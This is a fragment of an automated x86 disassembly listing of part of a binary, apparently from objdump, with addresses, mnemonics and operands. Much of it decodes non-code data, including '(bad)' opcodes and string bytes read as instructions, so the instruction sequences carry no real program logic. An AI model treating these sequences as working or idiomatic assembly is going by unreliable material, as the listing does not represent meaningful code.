  427992:	scas   al,BYTE PTR es:[edi]
  427993:	aaa    
  427994:	ficom  WORD PTR [ebx]
  427996:	(bad)  
  427997:	mov    BYTE PTR [ebx-0xf],al
  42799a:	das    
  42799b:	add    eax,0x808081db
  4279a0:	adc    bh,bh
  4279a2:	mov    dh,0x37
  4279a4:	ficom  WORD PTR [ebx]
  4279a6:	das    
  4279a7:	push   es
  4279a8:	into   
  4279a9:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  4279b3:	sub    bl,0x12
  4279b6:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  4279c0:	(bad)  
  4279c1:	adc    al,0x0
  4279c3:	(bad)  
  4279c4:	xor    BYTE PTR [eax],al
  4279c6:	(bad)  
  4279c7:	dec    esp
  4279c8:	add    dh,dl
  4279ca:	mov    BYTE PTR [ebp+0xff77],bh
  4279d0:	jmp    0x427988
  4279d2:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  4279dc:	mov    BYTE PTR [ebx-0xf],al
  4279df:	das    
  4279e0:	add    eax,0x80808019
  4279e5:	adc    bh,bh
  4279e7:	xchg   ecx,eax
  4279e8:	aaa    
  4279e9:	ficom  WORD PTR [ebx]
  4279eb:	(bad)  
  4279ec:	mov    BYTE PTR [ebx-0xf],al
  4279ef:	das    
  4279f0:	add    eax,0x8080818e
  4279f5:	adc    bh,bh
  4279f7:	(bad)  
  4279f8:	aaa    
  4279f9:	ficom  WORD PTR [ebx]
  4279fb:	(bad)  
  4279fc:	test   BYTE PTR [ebx-0xf],al
  4279ff:	aam    0x1c
  427a01:	adc    bh,bh
  427a03:	fidiv  WORD PTR [edi]
  427a05:	ficom  WORD PTR [ebx]
  427a07:	(bad)  
  427a08:	mov    BYTE PTR [ebx-0xf],al
  427a0b:	das    
  427a0c:	add    eax,0x80808142
  427a11:	adc    bh,bh
  427a13:	out    0x37,al
  427a15:	ficom  WORD PTR [ebx]
  427a17:	in     al,dx
  427a18:	iret   
  427a19:	int    0x96
  427a1b:	mov    ch,cl
  427a1d:	(bad)  
  427a1e:	dec    esp
  427a1f:	int    0xe6
  427a21:	mov    ch,cl
  427a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a24:	dec    esp
  427a25:	cmp    edx,DWORD PTR [ecx]
  427a27:	cmp    esp,ebx
  427a29:	das    
  427a2a:	inc    ebp
  427a2b:	sti    
  427a2c:	xchg   edx,eax
  427a2d:	shr    ecx,cl
  427a2f:	sub    BYTE PTR [edx],dl
  427a31:	clc    
  427a32:	add    BYTE PTR [eax-0x102c9380],0x92
  427a39:	cmp    ebx,ebp
  427a3b:	push   ebx
  427a3c:	clc    
  427a3d:	int    0xe6
  427a3f:	mov    BYTE PTR [ebx-0x2b],dl
  427a42:	int    0xa6
  427a44:	dec    esp
  427a45:	xchg   ecx,ebx
  427a47:	sbb    esi,esp
  427a49:	or     dl,BYTE PTR [esi+0x4cd60a88]
  427a4f:	int    0x96
  427a51:	mov    ch,cl
  427a53:	(bad)  
  427a54:	dec    esp
  427a55:	int    0xe6
  427a57:	mov    ch,cl
  427a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a5a:	dec    esp
  427a5b:	cmp    edx,DWORD PTR [ecx]
  427a5d:	cmp    esp,ebx
  427a5f:	das    
  427a60:	inc    ebp
  427a61:	sti    
  427a62:	xchg   edx,eax
  427a63:	shr    ecx,cl
  427a65:	sub    BYTE PTR [ebx],bh
  427a67:	fst    st(3)
  427a69:	out    dx,eax
  427a6a:	xchg   edx,eax
  427a6b:	adc    bh,al
  427a6d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a74:	clc    
  427a75:	ds xchg esi,eax
  427a77:	xor    BYTE PTR [esi],bl
  427a79:	(bad)  
  427a7a:	adc    al,0xcd
  427a7c:	xchg   esi,eax
  427a7d:	cmp    al,0xcd
  427a7f:	(bad)  
  427a80:	inc    esp
  427a81:	int    0x96
  427a83:	xor    ch,cl
  427a85:	(bad)  
  427a86:	adc    al,0xcd
  427a88:	xchg   esi,eax
  427a89:	xor    ch,cl
  427a8b:	(bad)  
  427a8c:	adc    al,0xcd
  427a8e:	out    0x30,al
  427a90:	int    0xa6
  427a92:	adc    al,0x3b
  427a94:	adc    DWORD PTR [ebx],edi
  427a96:	jecxz  0x427ac7
  427a98:	inc    ebp
  427a99:	sti    
  427a9a:	xchg   edx,eax
  427a9b:	shr    ecx,cl
  427a9d:	sub    BYTE PTR [ebx],bh
  427a9f:	fst    QWORD PTR [edx]
  427aa1:	clc    
  427aa2:	add    BYTE PTR [eax-0x102c9380],0x92
  427aa9:	push   ebx
  427aaa:	clc    
  427aab:	int    0xe6
  427aad:	cmp    al,0x53
  427aaf:	aad    0xcd
  427ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ab2:	inc    esp
  427ab3:	cmp    edi,edx
  427ab5:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427abb:	lea    eax,[edi+ebp*1+0x45]
  427abf:	loope  0x427a53
  427ac1:	cmp    ecx,ebx
  427ac3:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427ac9:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427ace:	lea    esi,[eax]
  427ad0:	shr    esp,cl
  427ad2:	xchg   edx,eax
  427ad3:	push   ebx
  427ad4:	popf   
  427ad5:	xchg   ecx,ebx
  427ad7:	int    0x96
  427ad9:	adc    al,0x1b
  427adb:	hlt    
  427adc:	add    al,0xf2
  427ade:	std    
  427adf:	shr    edi,cl
  427ae1:	sub    BYTE PTR [ebx],bh
  427ae3:	ins    DWORD PTR es:[edi],dx
  427ae4:	adc    al,BYTE PTR [edx]
  427ae6:	aam    0x37
  427ae8:	ficom  WORD PTR [ebx]
  427aea:	adc    bh,bl
  427aec:	mov    ebp,0xcd25230a
  427af1:	out    0x3c,al
  427af3:	int    0xa6
  427af5:	inc    esp
  427af6:	add    al,0xe9
  427af8:	std    
  427af9:	adc    bh,al
  427afb:	aam    0x37
  427afd:	ficom  WORD PTR [ebx]
  427aff:	adc    dh,ah
  427b01:	mov    ebp,0x8725230a
  427b06:	lock int 0xe6
  427b09:	and    al,0x1b
  427b0b:	aad    0x53
  427b0d:	rcl    BYTE PTR [esi-0x43],cl
  427b10:	or     ah,BYTE PTR [ebx]
  427b12:	and    eax,0x12025370
  427b17:	not    esi
  427b19:	aaa    
  427b1a:	ficom  WORD PTR [ebx]
  427b1c:	cwde   
  427b1d:	add    dh,dl
  427b1f:	xor    al,0x0
  427b21:	(bad)  
  427b22:	sub    al,0x9a
  427b24:	add    dh,dl
  427b26:	sbb    al,0x0
  427b28:	(bad)  
  427b29:	adc    al,0x0
  427b2b:	(bad)  
  427b2c:	xor    BYTE PTR [eax],al
  427b2e:	(bad)  
  427b2f:	dec    esp
  427b30:	add    dh,dl
  427b32:	mov    BYTE PTR [ebp+0xfef4],bh
  427b38:	or     cl,BYTE PTR [ebx-0x57557433]
  427b3e:	arpl   bx,cx
  427b40:	sar    BYTE PTR [eax+eax*4],cl
  427b43:	int    0x96
  427b45:	mov    ch,cl
  427b47:	(bad)  
  427b48:	dec    esp
  427b49:	int    0xe6
  427b4b:	mov    ch,cl
  427b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b4e:	dec    esp
  427b4f:	cmp    esp,ebx
  427b51:	cmp    edx,DWORD PTR [ecx]
  427b53:	das    
  427b54:	inc    ebp
  427b55:	sti    
  427b56:	xchg   edx,eax
  427b57:	shr    ecx,cl
  427b59:	sub    BYTE PTR [edx],dl
  427b5b:	clc    
  427b5c:	add    BYTE PTR [eax-0x102c9380],0x92
  427b63:	cmp    ebx,ebp
  427b65:	push   ebx
  427b66:	aad    0x53
  427b68:	clc    
  427b69:	int    0xe6
  427b6b:	xor    ch,cl
  427b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b6e:	adc    al,0x53
  427b70:	fst    DWORD PTR [ebx-0xc]
  427b73:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b79:	int    0x96
  427b7b:	cmp    al,0xcd
  427b7d:	(bad)  
  427b7e:	inc    esp
  427b7f:	int    0x96
  427b81:	xor    ch,cl
  427b83:	(bad)  
  427b84:	adc    al,0xcd
  427b86:	xchg   esi,eax
  427b87:	mov    ch,cl
  427b89:	(bad)  
  427b8a:	dec    esp
  427b8b:	int    0x96
  427b8d:	mov    ch,cl
  427b8f:	(bad)  
  427b90:	dec    esp
  427b91:	int    0xe6
  427b93:	mov    ch,cl
  427b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b96:	dec    esp
  427b97:	cmp    esp,ebx
  427b99:	cmp    edx,DWORD PTR [ecx]
  427b9b:	das    
  427b9c:	inc    ebp
  427b9d:	sti    
  427b9e:	xchg   edx,eax
  427b9f:	shr    ecx,cl
  427ba1:	sub    BYTE PTR [edx],dl
  427ba3:	clc    
  427ba4:	add    BYTE PTR [eax-0x22c49380],0x53
  427bab:	aad    0xd3
  427bad:	out    dx,eax
  427bae:	xchg   edx,eax
  427baf:	push   ebx
  427bb0:	clc    
  427bb1:	int    0xe6
  427bb3:	xor    ch,cl
  427bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bb6:	adc    al,0x3b
  427bb8:	cli    
  427bb9:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427bbf:	lea    edx,[edi+ebp*1]
  427bc2:	inc    ebp
  427bc3:	loope  0x427b57
  427bc5:	cmp    ecx,ebx
  427bc7:	push   ebx
  427bc8:	cli    
  427bc9:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427bcf:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427bd4:	push   ebx
  427bd5:	popf   
  427bd6:	int    0x76
  427bd8:	cmp    al,0xcd
  427bda:	lea    eax,[edi+eax*4-0x27]
  427bde:	int    0xe6
  427be0:	cmp    al,0x1b
  427be2:	hlt    
  427be3:	int    0xa6
  427be5:	inc    esp
  427be6:	adc    al,BYTE PTR [edx]
  427be8:	mov    ebp,0x5625230a
  427bed:	jnp    0x427c26
  427bef:	ficom  WORD PTR [ebx]
  427bf1:	das    
  427bf2:	inc    ebp
  427bf3:	jge    0x427b87
  427bf5:	shr    ecx,cl
  427bf7:	sub    bl,dl
  427bf9:	jmp    0x427b8d
  427bfb:	cmp    ebx,ebp
  427bfd:	adc    bh,al
  427bff:	add    BYTE PTR [eax-0xfac9380],0x53
  427c06:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427c0c:	lea    ecx,[eax-0x32b36933]
  427c12:	out    0x30,al
  427c14:	int    0xa6
  427c16:	adc    al,0x4
  427c18:	repnz std 
  427c1a:	add    al,0xe9
  427c1c:	std    
  427c1d:	adc    al,BYTE PTR [edx]
  427c1f:	aam    0x37
  427c21:	ficom  WORD PTR [ebx]
  427c23:	adc    bh,al
  427c25:	aam    0x37
  427c27:	ficom  WORD PTR [ebx]
  427c29:	shr    edi,cl
  427c2b:	sub    BYTE PTR [ebx],bh
  427c2d:	ins    DWORD PTR es:[edi],dx
  427c2e:	adc    bh,bl
  427c30:	mov    ebp,0x1225230a
  427c35:	hlt    
  427c36:	mov    ebp,0x8725230a
  427c3b:	lock sbb edx,ebp
  427c3e:	jmp    0x427c87
  427c40:	inc    DWORD PTR [eax]
  427c42:	add    BYTE PTR [esi-0x12fb1233],dl
  427c48:	sbb    al,0x98
  427c4a:	pop    edi
  427c4b:	(bad)  
  427c4c:	aaa    
  427c4d:	ficom  WORD PTR [ebx]
  427c4f:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427c55:	and    esp,DWORD PTR ds:0xc9f5760a
  427c5b:	jbe    0x427c1a
  427c5d:	xchg   ecx,eax
  427c5e:	aaa    
  427c5f:	ficom  WORD PTR [ebx]
  427c61:	or     dh,BYTE PTR [esi-0x13]
  427c64:	int    0x96
  427c66:	adc    ebp,ecx
  427c68:	(bad)  
  427c69:	cmc    
  427c6a:	call   0xefd3:0x92fb452f
  427c71:	xchg   edx,eax
  427c72:	int    0xd6
  427c74:	adc    ebp,ecx
  427c76:	out    0xf5,al
  427c78:	jo     0x427c8c
  427c7a:	sti    
  427c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c7c:	mov    esi,0x3b4229
  427c81:	jno    0x427cd6
  427c83:	(bad)  [edx]
  427c85:	xchg   esi,eax
  427c86:	std    
  427c87:	int    0x96
  427c89:	dec    esp
  427c8a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c90:	iret   
  427c91:	jbe    0x427c90
  427c93:	add    dh,dl
  427c95:	mov    bl,dl
  427c97:	mov    ecx,0xd6007028
  427c9c:	dec    esp
  427c9d:	add    dh,dl
  427c9f:	in     eax,dx
  427ca0:	add    dh,dl
  427ca2:	mov    ebp,0xf5d600
  427ca7:	(bad)  
  427ca8:	adc    DWORD PTR [ebp+0xfde6],edi
  427cae:	stos   BYTE PTR es:[edi],al
  427caf:	or     dh,BYTE PTR [esi-0x3]
  427cb2:	int    0x76
  427cb4:	std    
  427cb5:	test   al,0xcb
  427cb7:	ror    BYTE PTR [eax-0x12326980],cl
  427cbd:	add    al,0xb5
  427cbf:	stc    
  427cc0:	add    al,0xed
  427cc2:	inc    esp
  427cc3:	cwde   
  427cc4:	leave  
  427cc5:	je     0x427cfb
  427cc7:	xor    al,0x80
  427cc9:	add    BYTE PTR [eax+0x3474c980],0x44
  427cd0:	add    BYTE PTR [eax+0x74cf8080],0x34
  427cd7:	xor    BYTE PTR [eax+0x0],dh
  427cda:	(bad)  
  427cdb:	xor    al,0x0
  427cdd:	(bad)  
  427cde:	sub    al,0x0
  427ce0:	(bad)  
  427ce1:	and    al,0x0
  427ce3:	(bad)  
  427ce4:	sbb    al,0x0
  427ce6:	(bad)  
  427ce7:	adc    al,0x0
  427ce9:	(bad)  
  427cea:	xor    BYTE PTR [eax],al
  427cec:	(bad)  
  427ced:	dec    esp
  427cee:	add    dh,dl
  427cf0:	mov    BYTE PTR [ebp+0xe7e7],bh
  427cf6:	int    0x76
  427cf8:	mov    BYTE PTR [edx],cl
  427cfa:	je     0x427d30
  427cfc:	test   ch,cl
  427cfe:	je     0x427d34
  427d00:	xor    al,0x6
  427d02:	ins    DWORD PTR es:[edi],dx
  427d03:	das    
  427d04:	add    eax,0x80808017
  427d09:	int    0x74
  427d0b:	xor    al,0x44
  427d0d:	push   es
  427d0e:	ins    DWORD PTR es:[edi],dx
  427d0f:	das    
  427d10:	add    eax,0x8080800a
  427d15:	add    ah,dl
  427d17:	xor    al,0x24
  427d19:	add    ah,dl
  427d1b:	xor    al,0x24
  427d1d:	add    ah,dl
  427d1f:	xor    al,0x24
  427d21:	int    0x74
  427d23:	xor    al,0x50
  427d25:	add    cl,dh
  427d27:	int    0x74
  427d29:	xor    al,0x84
  427d2b:	int    0x74
  427d2d:	xor    al,0x84
  427d2f:	int    0x74
  427d31:	xor    al,0x84
  427d33:	iret   
  427d34:	jbe    0x427cba
  427d36:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427d3a:	int    0x74
  427d3c:	xor    al,0x3c
  427d3e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427d42:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427d46:	int    0x74
  427d48:	xor    al,0x84
  427d4a:	int    0x74
  427d4c:	xor    al,0x84
  427d4e:	int    0x8c
  427d50:	xor    al,0x84
  427d52:	int    0xa
  427d54:	and    eax,0xcd808081
  427d59:	xor    ebp,ecx
  427d5b:	aam    0x34
  427d5d:	mov    ch,cl
  427d5f:	add    DWORD PTR ds:0x5e808081,ebp
  427d65:	sbb    BYTE PTR [edi],ch
  427d67:	or     edx,DWORD PTR ds:0xcd808081
  427d6d:	xor    ch,cl
  427d6f:	push   eax
  427d70:	int    0x62
  427d72:	fs iret 
  427d74:	xchg   esp,eax
  427d75:	sbb    BYTE PTR [eax-0x33],dh
  427d78:	push   ecx
  427d79:	int    0x22
  427d7b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d81:	pop    esi
  427d82:	sbb    BYTE PTR [edi],ch
  427d84:	add    al,0x7b
  427d86:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d90:	dec    edx
  427d91:	int    0x80
  427d93:	xor    ecx,DWORD PTR [edi]
  427d95:	xchg   ebx,edx
  427d97:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d9d:	or     ch,0x74
  427da0:	xor    al,0x44
  427da2:	push   es
  427da3:	ins    DWORD PTR es:[edi],dx
  427da4:	das    
  427da5:	push   es
  427da6:	cwde   
  427da7:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427db1:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427dbb:	je     0x427df1
  427dbd:	test   ch,cl
  427dbf:	add    DWORD PTR ds:0xcd808081,esp
  427dc5:	or     BYTE PTR [edx],0x74
  427dc8:	xor    al,0x4c
  427dca:	int    0x74
  427dcc:	xor    al,0x84
  427dce:	int    0x1
  427dd0:	or     DWORD PTR [ecx-0x7f327f80],eax
  427dd6:	int    0x80
  427dd8:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427ddc:	int    0x74
  427dde:	xor    al,0x84
  427de0:	int    0x1
  427de2:	int3   
  427de3:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427ded:	dec    esp
  427dee:	int    0x74
  427df0:	xor    al,0x84
  427df2:	int    0x8c
  427df4:	xor    al,0x84
  427df6:	int    0x1
  427df8:	popf   
  427df9:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427e03:	or     ch,0x89
  427e06:	imul   edx,ecx,0x3b358621
  427e0c:	jns    0x427e12
  427e0e:	add    bh,bh
  427e10:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427e16:	push   ebx
  427e17:	jge    0x427e23
  427e19:	mov    WORD PTR [esp+ecx*2],?
  427e1c:	leave  
  427e1d:	je     0x427e53
  427e1f:	mov    BYTE PTR [eax-0x327f7f80],al
  427e25:	je     0x427e5b
  427e27:	xor    al,0x6
  427e29:	ins    DWORD PTR es:[edi],dx
  427e2a:	aam    0x73
  427e2c:	int    0x74
  427e2e:	xor    al,0x30
  427e30:	add    al,0xbd
  427e32:	adc    ah,0x52
  427e35:	jl     0x427e0b
  427e37:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427e3b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427e3f:	add    ah,dl
  427e41:	xor    al,0x2c
  427e43:	add    ah,dl
  427e45:	xor    al,0x2c
  427e47:	add    ah,dl
  427e49:	xor    al,0x2c
  427e4b:	add    ah,dl
  427e4d:	xor    al,0x2c
  427e4f:	int    0x74
  427e51:	xor    al,0x54
  427e53:	add    cl,dh
  427e55:	in     al,dx
  427e56:	cmp    BYTE PTR [eax],al
  427e58:	aam    0x34
  427e5a:	and    al,0x0
  427e5c:	aam    0x34
  427e5e:	and    al,0x0
  427e60:	aam    0x34
  427e62:	and    al,0xcd
  427e64:	je     0x427e9a
  427e66:	push   eax
  427e67:	add    cl,dh
  427e69:	in     al,dx
  427e6a:	and    al,BYTE PTR [eax]
  427e6c:	aam    0x34
  427e6e:	adc    al,0xcd
  427e70:	je     0x427ea6
  427e72:	cmp    al,0x0
  427e74:	icebp  
  427e75:	in     al,dx
  427e76:	xchg   ch,cl
  427e78:	je     0x427eae
  427e7a:	xor    al,0x0
  427e7c:	icebp  
  427e7d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e81:	int    0x74
  427e83:	xor    al,0x4c
  427e85:	push   es
  427e86:	ins    DWORD PTR es:[edi],dx
  427e87:	aam    0x4e
  427e89:	int    0x74
  427e8b:	xor    al,0x84
  427e8d:	leave  
  427e8e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e94:	and    DWORD PTR [esi+0x3474cd35],eax
  427e9a:	mov    ch,cl
  427e9c:	mov    WORD PTR [esp+eax*4],?
  427e9f:	int    0xa
  427ea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ea2:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427eac:	and    DWORD PTR [esi+0x3474cd35],eax
  427eb2:	mov    ch,cl
  427eb4:	mov    WORD PTR [eax+ecx*4],?
  427eb7:	cmp    edi,DWORD PTR [ecx+0x4]
  427eba:	add    bh,bh
  427ebc:	shl    edx,cl
  427ebe:	sub    bl,dl
  427ec0:	mov    ebp,0xcdd35392
  427ec5:	mov    WORD PTR [esp+ecx*2],?
  427ec8:	inc    ebx
  427ec9:	rcl    esi,cl
  427ecb:	and    ecx,ebp
  427ecd:	je     0x427f03
  427ecf:	test   ch,cl
  427ed1:	mov    WORD PTR [esp+eax*4],?
  427ed4:	int    0xa
  427ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ed7:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427ee1:	add    BYTE PTR [eax],0x70
  427ee4:	cmp    al,0xec
  427ee6:	push   ds
  427ee7:	iret   
  427ee8:	jbe    0x427e6e
  427eea:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427eee:	int    0x74
  427ef0:	xor    al,0x4c
  427ef2:	int    0x8c
  427ef4:	xor    al,0x84
  427ef6:	int    0xa
  427ef8:	in     al,0x81
  427efa:	add    BYTE PTR [eax-0x777e7633],0xcd
  427f01:	je     0x427f37
  427f03:	test   ch,cl
  427f05:	add    ebp,ebp
  427f07:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427f11:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427f17:	or     bh,0x84
  427f1a:	adc    cl,ch
  427f1c:	mov    WORD PTR [esp+eax*4],?
  427f1f:	int    0xa
  427f21:	in     al,0x81
  427f23:	add    BYTE PTR [eax-0x76327f33],0x81
  427f2a:	mov    BYTE PTR [eax-0x2d591833],ch
  427f30:	sub    al,0x80
  427f32:	lds    edx,FWORD PTR [eax+0x75]
  427f35:	ins    BYTE PTR es:[edi],dx
  427f36:	jae    0x427faf
  427f38:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427f3c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427f40:	add    BYTE PTR [ecx+0x74],ah
  427f43:	ins    BYTE PTR es:[edi],dx
  427f44:	popa   
  427f45:	inc    esp
  427f46:	gs popa 
  427f48:	fs push 0x6561686d
  427f4e:	add    BYTE PTR fs:[ebp+0x74],ah
  427f52:	push   0x65726143
  427f57:	outs   dx,DWORD PTR ds:[esi]
  427f58:	jns    0x427fc0
  427f5a:	add    BYTE PTR gs:[edi+0x72],dh
  427f5e:	jns    0x427fcd
  427f60:	popa   
  427f61:	outs   dx,DWORD PTR ds:[esi]
  427f62:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f66:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f6a:	push   0x6f6d6568
  427f6f:	add    BYTE PTR fs:[edx+0x65],dl
  427f73:	arpl   WORD PTR [ebx+0x62],si
  427f76:	popa   
  427f77:	ins    BYTE PTR es:[edi],dx
  427f78:	jne    0x427ff2
  427f7a:	gs jae 0x427f7d
  427f7d:	ins    DWORD PTR es:[edi],dx
  427f7e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f85:	outs   dx,DWORD PTR ds:[esi]
  427f86:	jb     0x427ff7
  427f88:	jo     0x427f8a
  427f8a:	ja     0x427fed
  427f8c:	gs je  0x427ffe
  427f8f:	jb     0x428000
  427f91:	bound  esp,QWORD PTR [ecx+0x70]
  427f94:	add    BYTE PTR [ebx+0x69],cl
  427f97:	outs   dx,BYTE PTR ds:[esi]
  427f98:	addr16 addr16 popa 
  427f9b:	outs   dx,BYTE PTR ds:[esi]
  427f9c:	arpl   WORD PTR [ecx+0x70],sp
  427f9f:	add    BYTE PTR [edi+0x6e],al
  427fa2:	jne    0x428017
  427fa4:	je     0x42800b
  427fa6:	outs   dx,BYTE PTR ds:[esi]
  427fa7:	push   esi
  427fa8:	popa   
  427fa9:	jb     0x428024
  427fab:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427faf:	jb     0x428001
  427fb1:	popa   
  427fb2:	ins    BYTE PTR es:[edi],dx
  427fb3:	ins    DWORD PTR es:[edi],dx
  427fb4:	je     0x42801f
  427fb6:	outs   dx,DWORD PTR ds:[esi]
  427fb7:	ja     0x42801e
  427fb9:	jb     0x427fbb
  427fbb:	jo     0x428022
  427fbd:	ins    DWORD PTR es:[edi],dx
  427fbe:	jns    0x428034
  427fc0:	push   0x6f656562
  427fc5:	outs   dx,BYTE PTR ds:[esi]
  427fc6:	push   eax
  427fc7:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427fce:	inc    ebx
  427fcf:	outs   dx,DWORD PTR ds:[esi]
  427fd0:	popa   
  427fd1:	ins    BYTE PTR es:[edi],dx
  427fd2:	popa   
  427fd3:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427fda:	je     0x428055
  427fdc:	outs   dx,DWORD PTR gs:[esi]
  427fde:	outs   dx,BYTE PTR ds:[esi]
  427fdf:	gs ins BYTE PTR es:[edi],dx
  427fe1:	inc    ebx
  427fe2:	push   0x54007261
  427fe7:	jns    0x428059
  427fe9:	jns    0x428058
  427feb:	jne    0x428052
  427fed:	imul   eax,DWORD PTR gs:[eax],0x70
  427ff1:	outs   dx,DWORD PTR ds:[esi]
  427ff2:	je     0x428036
  427ff4:	gs gs jb 0x428068
  427ff8:	outs   dx,DWORD PTR ds:[esi]
  427ff9:	je     0x428066
  427ffb:	imul   eax,DWORD PTR [eax],0x616c7548
  428001:	jo     0x42806c
  428003:	popa   
  428004:	ins    BYTE PTR es:[edi],dx
  428005:	dec    ebx
  428006:	outs   dx,BYTE PTR ds:[esi]
  428007:	popa   
  428008:	jo     0x428083
  42800a:	add    BYTE PTR gs:[eax+0x6f],dh
  42800e:	je     0x428052
  428010:	gs ins BYTE PTR es:[edi],dx
  428012:	jae    0x428083
  428014:	js     0x428016
  428016:	popa   
  428017:	data16 je 0x428060
  42801a:	ins    BYTE PTR es:[edi],dx
  42801b:	popa   
  42801c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  428020:	gs jae 0x428084
  428023:	jb     0x428025
  428025:	inc    edx
  428026:	ins    BYTE PTR es:[edi],dx
  428027:	popa   
  428028:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  42802c:	je     0x428094
  42802e:	ins    BYTE PTR es:[edi],dx
  42802f:	jns    0x4280a6
  428031:	push   0x6d6d6800
  428036:	popa   
  428037:	inc    edi
  428038:	popa   
  428039:	ins    BYTE PTR es:[edi],dx
  42803a:	ins    BYTE PTR es:[edi],dx
  42803b:	push   0x48007361
  428040:	outs   dx,DWORD PTR ds:[esi]
  428041:	ins    DWORD PTR es:[edi],dx
  428042:	outs   dx,DWORD PTR gs:[esi]
  428044:	jb     0x4280ab
  428046:	data16 jno 0x4280b2
  428049:	jae    0x4280ac
  42804b:	bound  esi,QWORD PTR [eax+0x61]
  42804e:	add    BYTE PTR [ebp+0x74],ah
  428051:	outs   dx,BYTE PTR ds:[esi]
  428052:	gs addr16 jbe 0x4280b7
  428056:	je     0x4280d1
  428058:	gs popa 
  42805a:	add    BYTE PTR [ebp+0x67],ah
  42805d:	outs   dx,DWORD PTR ds:[esi]
  42805e:	inc    edi
  42805f:	popa   
  428060:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428068:	jo     0x4280cf
  42806a:	fs jbe 0x4280ce
  42806d:	je     0x4280e4
  42806f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428073:	outs   dx,DWORD PTR ds:[esi]
  428074:	add    BYTE PTR [edx+0x0],ch
  428077:	jne    0x428079
  428079:	add    BYTE PTR [bp+0x0],ch
  42807d:	popa   
  42807e:	add    BYTE PTR [esi+0x0],ch
  428081:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428086:	add    BYTE PTR [ebp+0x0],dh
  428089:	ins    DWORD PTR es:[edi],dx
  42808a:	add    BYTE PTR [eax],al
  42808c:	add    BYTE PTR [edi+0x0],ch
  42808f:	jb     0x428091
  428091:	ja     0x428093
  428093:	imul   eax,DWORD PTR [eax],0x680073
  428099:	outs   dx,BYTE PTR ds:[esi]
  42809a:	add    BYTE PTR [ecx+0x0],ch
  42809d:	add    BYTE PTR fs:[ecx+0x0],ch
  4280a1:	ja     0x4280a3
  4280a3:	imul   eax,DWORD PTR [eax],0x65006e
  4280a9:	push   0x70000000
  4280ae:	add    BYTE PTR [ecx+0x0],ah
  4280b1:	je     0x4280b3
  4280b3:	jbe    0x4280b5
  4280b5:	add    BYTE PTR gs:[ebp+0x0],ah
  4280b9:	je     0x4280bb
  4280bb:	add    BYTE PTR gs:[edi+0x0],ah
  4280bf:	ins    BYTE PTR es:[edi],dx
  4280c0:	add    BYTE PTR [ecx+0x0],ah
  4280c3:	imul   eax,DWORD PTR [eax],0x66
  4280c9:	outs   dx,DWORD PTR ds:[esi]
  4280ca:	add    BYTE PTR [esi+0x0],ch
  4280cd:	je     0x4280cf
  4280cf:	popa   
  4280d0:	add    BYTE PTR [edi+0x0],dh
  4280d3:	push   ebx
  4280d4:	add    BYTE PTR [edi+0x0],ch
  4280d7:	arpl   WORD PTR [eax],ax
  4280d9:	imul   eax,DWORD PTR [eax],0x61
  4280dc:	add    BYTE PTR [esi+0x0],dh
  4280df:	outs   dx,DWORD PTR ds:[esi]
  4280e0:	add    BYTE PTR [eax],al
  4280e2:	add    BYTE PTR [ebp+0x0],ch
  4280e5:	jns    0x4280e7
  4280e7:	add    BYTE PTR gs:[esi+0x0],ah
  4280eb:	ins    BYTE PTR es:[edi],dx
